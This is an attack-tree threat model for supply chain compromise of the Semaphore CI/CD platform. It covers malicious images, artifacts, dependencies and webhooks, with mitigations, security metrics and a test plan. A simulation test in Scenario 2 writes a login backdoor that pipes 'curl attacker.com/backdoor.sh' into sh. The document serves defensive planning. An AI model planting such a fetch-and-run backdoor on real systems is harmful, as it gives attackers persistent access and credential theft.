# Attack Tree: Supply Chain Attacks

## Goal
Compromise Semaphore platform or its users via supply chain manipulation (malicious images, artifacts, dependencies).

## Attack Tree

```
[Root] Supply Chain Compromise
│
├─[OR]─ Malicious Container Images
│   │
│   ├─[AND]─ Compromised Base Image
│   │   ├─ Attacker compromises official base image (e.g., node:18-alpine in Docker Hub)
│   │   ├─ Semaphore pulls infected image during build
│   │   └─ Backdoor executes on pod startup, exfiltrates secrets
│   │
│   ├─[AND]─ Typosquatting Attack
│   │   ├─ Attacker publishes malicious image with similar name (e.g., "nodejs" vs "node-js")
│   │   ├─ Developer mistypes image name in Dockerfile
│   │   └─ Malicious image deployed to production
│   │
│   ├─[AND]─ Untrusted Registry
│   │   ├─ Developer uses image from untrusted registry (docker.io/random-user/...)
│   │   ├─ No image signature verification (BASELINE: NO)
│   │   ├─ No vulnerability scanning before deployment (BASELINE: NO)
│   │   └─ Image contains cryptominer or backdoor
│   │
│   └─[AND]─ Image Tag Mutation
│       ├─ Attacker overwrites "latest" or "v1.0" tag with malicious image
│       ├─ Kubernetes pulls image with same tag, gets malicious version
│       └─ No image digest pinning (BASELINE: uses tags, not SHA256)
│
├─[OR]─ Malicious Build Artifacts
│   │
│   ├─[AND]─ ArtifactHub Tampering
│   │   ├─ Attacker gains access to MinIO (stolen credentials)
│   │   ├─ Replace legitimate build artifact with backdoored version
│   │   ├─ No artifact signing (BASELINE: NO)
│   │   └─ Customer downloads malicious artifact
│   │
│   ├─[AND]─ Man-in-the-Middle on Artifact Download
│   │   ├─ Attacker intercepts artifact download (HTTP, not HTTPS)
│   │   ├─ Replace artifact in transit
│   │   └─ No checksum verification (BASELINE: NO)
│   │
│   └─[AND]─ Build Cache Poisoning
│       ├─ Attacker modifies Docker layer cache in MinIO
│       ├─ Subsequent builds use poisoned layers
│       └─ Backdoor propagates to all builds using affected base layer
│
├─[OR]─ Malicious Dependencies
│   │
│   ├─[AND]─ NPM Package Compromise
│   │   ├─ Attacker compromises maintainer account of popular package
│   │   ├─ Publish malicious version to NPM registry
│   │   ├─ Semaphore Front service pulls infected package during build
│   │   └─ Backdoor exfiltrates environment variables on server start
│   │
│   ├─[AND]─ Hex Package Compromise (Elixir)
│   │   ├─ Similar attack on Hex.pm for Elixir dependencies
│   │   ├─ Guard/Controller services pull infected package
│   │   └─ Backdoor gains access to PostgreSQL credentials
│   │
│   ├─[AND]─ Dependency Confusion
│   │   ├─ Attacker publishes public package with same name as internal package
│   │   ├─ Build system prioritizes public registry over internal
│   │   └─ Malicious package installed instead of legitimate one
│   │
│   └─[AND]─ Subdependency Compromise
│       ├─ Attacker compromises obscure transitive dependency
│       ├─ Main dependency pulls infected subdependency
│       └─ Difficult to detect (not in main package.json/mix.exs)
│
├─[OR]─ Malicious Source Code
│   │
│   ├─[AND]─ Git Repository Compromise
│   │   ├─ Attacker gains access to GitHub repository (stolen PAT)
│   │   ├─ Push malicious commit to main branch
│   │   ├─ Automated builds deploy compromised code
│   │   └─ No code review for automated commits (dependabot, etc.)
│   │
│   ├─[AND]─ Git Clone Man-in-the-Middle
│   │   ├─ Attacker intercepts git clone during build (HTTP, not HTTPS)
│   │   ├─ Serve malicious repository
│   │   └─ No commit signature verification (BASELINE: NO)
│   │
│   ├─[AND]─ Webhook Injection
│   │   ├─ Attacker spoofs GitHub webhook to ProjectHub
│   │   ├─ No webhook signature verification (BASELINE: VERIFY)
│   │   ├─ Triggers build of malicious repository
│   │   └─ Malicious code executed in agent pod
│   │
│   └─[AND]─ Pull Request Attack
│       ├─ Attacker submits PR with malicious code in .semaphore/semaphore.yml
│       ├─ PR builds run with secrets access (BASELINE: YES)
│       └─ Exfiltrates secrets during PR build
│
└─[OR]─ Infrastructure Compromise
    │
    ├─[AND]─ Terraform Provider Compromise
    │   ├─ Attacker compromises Terraform provider (e.g., Google provider)
    │   ├─ Malicious provider modifies GKE cluster configuration
    │   └─ Backdoor allows persistent cluster access
    │
    ├─[AND]─ Helm Chart Tampering
    │   ├─ Attacker compromises Helm chart repository
    │   ├─ Modified chart includes malicious init container
    │   └─ Init container exfiltrates secrets before main pod starts
    │
    └─[AND]─ Kubernetes Admission Webhook Compromise
        ├─ Attacker deploys malicious validating/mutating webhook
        ├─ Webhook modifies all pod specs to inject sidecar
        └─ Sidecar container exfiltrates secrets from all pods
```

## Attack Scenarios

### Scenario 1: NPM Package Compromise → Full Platform Breach [CRITICAL]

**Attack Chain:**
1. Attacker compromises maintainer account of `express-jwt` (used by Semaphore Front)
2. Publishes malicious version that exfiltrates JWT signing key on startup
3. Semaphore CI/CD pipeline automatically builds new Front image with infected package
4. Deployment rolls out to production (no vulnerability scan)
5. Front service starts, sends JWT key to attacker C2 server
6. Attacker forges admin JWT tokens, gains full platform access

**Baseline Detection:** ❌ None
**Impact:**
- Full compromise of authentication system
- Ability to forge tokens for any user
- Access to all projects, secrets, build logs

**Baseline Gaps:**
- No Software Bill of Materials (SBOM) tracking
- No dependency vulnerability scanning before deployment
- No runtime integrity monitoring
- No egress restrictions (can phone home to attacker)

**Mitigations:**
```yaml
# Phase 03: CI/CD Security Pipeline
1. Trivy scan for known vulnerabilities:
   trivy fs --scanners vuln,secret,misconfig .

2. Generate and verify SBOM:
   syft . -o spdx-json > sbom.json
   grype sbom:sbom.json --fail-on critical

3. Dependency update policy:
   - Only patch versions auto-merged
   - Minor/major versions require security review

4. Phase 08: Egress NetworkPolicy:
   - Front pod can only reach Guard, Controller
   - Block all external connections

5. Phase 07: Anomaly Detection:
   - Alert on unexpected network connections from Front
   - Baseline normal traffic patterns

6. Phase 03: Image Signing:
   - Sign all production images with Cosign
   - Verify signatures at deployment time
```

---

### Scenario 2: Malicious Base Image → Persistent Backdoor [HIGH]

**Attack Chain:**
1. Attacker compromises `alpine:3.18` image on Docker Hub
2. Adds backdoor in `/etc/profile.d/backdoor.sh` (executes on shell login)
3. Semaphore builds agent image using `FROM alpine:3.18`
4. Agent pods run backdoored base image
5. Backdoor activates when developer execs into pod for debugging
6. Attacker gains interactive shell, steals credentials

**Baseline Detection:** ❌ None (image looks legitimate)
**Impact:**
- Persistent access to all agent pods
- Credential theft from pod environment
- Ability to modify build artifacts

**Baseline Gaps:**
- No image provenance verification
- No base image digest pinning (uses tags like `alpine:3.18`, not `alpine@sha256:...`)
- No runtime file integrity monitoring

**Mitigations:**
```yaml
# Phase 03: Image Security

1. Pin base images to immutable digests:
   # Bad:  FROM alpine:3.18
   # Good: FROM alpine@sha256:8914eb54f968791faf6a8638949e480fef81e697984fba772b3976835194c6d4

2. Verify image signatures:
   cosign verify --key cosign.pub alpine@sha256:...

3. Scan base images:
   trivy image alpine@sha256:...

4. Phase 06: Falco Detection:
   - Alert on unexpected files in /etc/profile.d
   - Detect reverse shell connections

5. Phase 09: Binary Authorization (GKE):
   - Only allow images from trusted registries
   - Require Cosign signature attestation
```

**Test:**
```bash
# Simulate malicious base image detection
echo '#!/bin/sh\ncurl attacker.com/backdoor.sh | sh' > /etc/profile.d/backdoor.sh
chmod +x /etc/profile.d/backdoor.sh

# Expected detections:
# 1. Trivy scan: "High severity: Malicious script detected"
# 2. Falco: "Write to /etc/profile.d detected"
# 3. Binary Authorization: "Image signature verification failed"
```

---

### Scenario 3: Artifact Tampering → Customer Compromise [CRITICAL]

**Attack Chain:**
1. Customer builds iOS app using Semaphore
2. Build artifact (IPA file) uploaded to ArtifactHub (MinIO)
3. Attacker compromises MinIO credentials (stored in Kubernetes Secret)
4. Replaces legitimate IPA with trojanized version
5. Customer downloads artifact, publishes to App Store
6. Millions of end users install backdoored app

**Baseline Detection:** ❌ None
**Impact:**
- Supply chain attack on Semaphore customers
- Reputational damage to Semaphore platform
- Legal liability for compromised apps

**Baseline Gaps:**
- No artifact signing (customers can't verify authenticity)
- No tamper-evident logging (artifact modifications not audited)
- MinIO access keys too permissive (can overwrite any artifact)

**Mitigations:**
```yaml
# Phase 03: Artifact Provenance

1. Sign artifacts with Cosign:
   cosign sign-blob --key cosign.key artifact.ipa > artifact.ipa.sig

2. Generate in-toto attestation:
   in-toto-run --step-name build --key builder.key \
     --materials . --products artifact.ipa -- make build

3. Store provenance in transparent log:
   rekor-cli upload --artifact artifact.ipa \
     --signature artifact.ipa.sig --public-key cosign.pub

4. Phase 11: Immutable Artifact Storage:
   - MinIO Object Lock (WORM mode)
   - Versioning enabled, can't overwrite artifacts

5. Phase 07: Tamper Detection:
   - Alert on any artifact modification attempts
   - Audit log of all MinIO access

6. Customer Verification:
   cosign verify-blob --key cosign.pub \
     --signature artifact.ipa.sig artifact.ipa
```

---

### Scenario 4: Dependency Confusion → Internal Secrets Leak [MEDIUM]

**Attack Chain:**
1. Attacker discovers Semaphore uses internal package `@semaphore/auth-lib`
2. Publishes malicious package `@semaphore/auth-lib` to public NPM
3. Package has higher version number (9.9.9 vs internal 1.0.0)
4. NPM prioritizes public registry, installs malicious package
5. Package exfiltrates environment variables during install (postinstall script)

**Baseline Detection:** ❌ None
**Impact:**
- Leak of internal API keys, database credentials
- Potential for backdoored internal libraries

**Baseline Gaps:**
- No `.npmrc` scoping (@semaphore/* must come from internal registry)
- No integrity checking for internal packages
- postinstall scripts run without sandboxing

**Mitigations:**
```yaml
# Phase 03: Dependency Management

1. Scope internal packages in .npmrc:
   @semaphore:registry=https://npm.internal.semaphore.com
   always-auth=true

2. Use package lock files:
   npm ci --audit  # Fail on known vulnerabilities

3. Verify package integrity:
   npm audit signatures

4. Block postinstall scripts in CI:
   npm install --ignore-scripts
   # Only run scripts after manual review

5. Phase 03: SBOM Comparison:
   syft . -o spdx-json > sbom-current.json
   diff sbom-baseline.json sbom-current.json
   # Alert on unexpected new dependencies
```

---

## Mitigation Summary

| Attack Vector | Baseline Risk | Security Control | Residual Risk | Phase |
|---------------|---------------|------------------|---------------|-------|
| Malicious base image | **CRITICAL** | Image signing, digest pinning, Binary Auth | LOW | 03, 09 |
| NPM package compromise | **CRITICAL** | SBOM, Trivy scan, egress restriction | MEDIUM | 03, 08 |
| Artifact tampering | **CRITICAL** | Artifact signing, immutable storage | LOW | 03, 11 |
| Dependency confusion | **HIGH** | Registry scoping, integrity checks | LOW | 03 |
| Git repo compromise | **HIGH** | Commit signing, branch protection | MEDIUM | 03 |
| Webhook spoofing | **MEDIUM** | HMAC verification, IP allowlist | LOW | 03 |
| Image tag mutation | **HIGH** | Digest pinning, admission policy | LOW | 03, 09 |
| Build cache poisoning | **MEDIUM** | Immutable cache, layer scanning | LOW | 03, 11 |

---

## Supply Chain Security Metrics

| Metric | Baseline | Target | Tool |
|--------|----------|--------|------|
| % images with known CVEs | **85%** | <5% | Trivy |
| % images signed | **0%** | 100% | Cosign |
| % artifacts signed | **0%** | 100% | Cosign |
| Dependency update lag (days) | **120** | <30 | Dependabot |
| SBOM coverage | **0%** | 100% | Syft |
| Provenance attestation | **0%** | 100% | in-toto |

---

## Testing Plan

### Test 1: Unsigned Image Rejection
```bash
# Attempt to deploy unsigned image
kubectl run test --image=nginx:latest

# Expected result: Blocked by Binary Authorization
# Error: "Image nginx:latest denied by policy: No valid signature found"
```

### Test 2: Vulnerable Dependency Detection
```bash
# Add vulnerable package to package.json
npm install lodash@4.17.19  # Known CVE-2020-8203

# Run security scan
trivy fs --scanners vuln .

# Expected result: Build fails
# Error: "High severity vulnerability CVE-2020-8203 in lodash@4.17.19"
```

### Test 3: Artifact Tamper Detection
```bash
# Modify artifact in MinIO
mc cp s3/artifacts/project-123/build-456/app.jar /tmp/
echo "backdoor" >> /tmp/app.jar
mc cp /tmp/app.jar s3/artifacts/project-123/build-456/app.jar

# Expected detection:
# 1. MinIO Object Lock: "Put operation not allowed in WORM mode"
# 2. Audit log: "Attempted modification of immutable object"
# 3. SIEM alert: "Artifact tampering detected"
```

### Test 4: Dependency Confusion Prevention
```bash
# Attempt to install package from wrong registry
npm config set @semaphore:registry https://registry.npmjs.org
npm install @semaphore/auth-lib

# Expected result: Error
# "Package @semaphore/auth-lib not found in internal registry"
```

---

## SLSA Compliance

Supply Chain Levels for Software Artifacts (SLSA) framework:

| SLSA Level | Requirements | Semaphore Status (Post-Mitigation) |
|------------|--------------|-------------------------------------|
| **SLSA 1** | Provenance exists | ✅ SBOM generated for all builds |
| **SLSA 2** | Tamper-resistant provenance | ✅ Signed with Cosign, stored in Rekor |
| **SLSA 3** | Audited build process | ✅ Falco monitors build agents |
| **SLSA 4** | Hermetic builds | ❌ Future: Isolated build environments |

Target: **SLSA Level 3** by end of thesis project.

---

## References

- **SLSA Framework:** https://slsa.dev/
- **Sigstore (Cosign/Rekor):** https://www.sigstore.dev/
- **in-toto Provenance:** https://in-toto.io/
- **Trivy Scanner:** https://github.com/aquasecurity/trivy
- **Syft SBOM Generator:** https://github.com/anchore/syft
- **Binary Authorization (GKE):** https://cloud.google.com/binary-authorization
- **Dependency Confusion:** https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
